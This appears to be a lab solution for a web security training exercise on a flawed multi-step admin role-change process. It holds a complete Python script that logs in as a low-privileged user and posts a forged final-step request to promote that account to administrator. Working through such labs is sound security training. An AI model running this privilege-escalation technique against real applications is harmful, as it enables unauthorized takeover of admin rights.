# Multi-step process with no access control on one step

> This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
> To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

```python
import requests
import sys

# Configuration
BASE_URL = "https://0a4500d90382b91d81577b830056009b.web-security-academy.net/"

def create_session(url):
    """Establishes a session and logs in as the low-privileged user."""
    session = requests.Session()
    login_endpoint = f"{url}login"
    
    # Credentials for the attacker account
    creds = {
        "username": "wiener",
        "password": "peter"
    }
    
    print(f"[*] Logging in as 'wiener' at {login_endpoint}...")
    response = session.post(login_endpoint, data=creds)
    
    if "Log out" in response.text:
        print("[+] Login Successful.")
        return session
    else:
        print("[-] Login Failed.")
        sys.exit(1)

def exploit_admin_promotion(url, session):
    """Bypasses the multi-step flow to promote the current user."""
    promote_endpoint = f"{url}admin-roles"
    
    # Payload mimics the final step of the admin workflow
    payload = {
        "action": "upgrade",
        "confirmed": "true",
        "username": "wiener"
    }
    
    print(f"[*] Sending direct promotion request to: {promote_endpoint}")
    response = session.post(promote_endpoint, data=payload)
    
    # Check for success (200 OK or 302 Redirect usually indicate processing)
    if response.status_code in [200, 302]:
        print("[+] Request sent. verifying privileges...")
        
        # Verification: Check if we can access the admin panel
        admin_check = session.get(f"{url}admin")
        if admin_check.status_code == 200:
            print("[+] SUCCESS: 'wiener' is now an Administrator.")
        else:
             print("[-] Promotion request sent, but Admin access denied.")
    else:
        print(f"[-] Request failed with status: {response.status_code}")

if __name__ == "__main__":
    user_session = create_session(BASE_URL)
    exploit_admin_promotion(BASE_URL, user_session)
```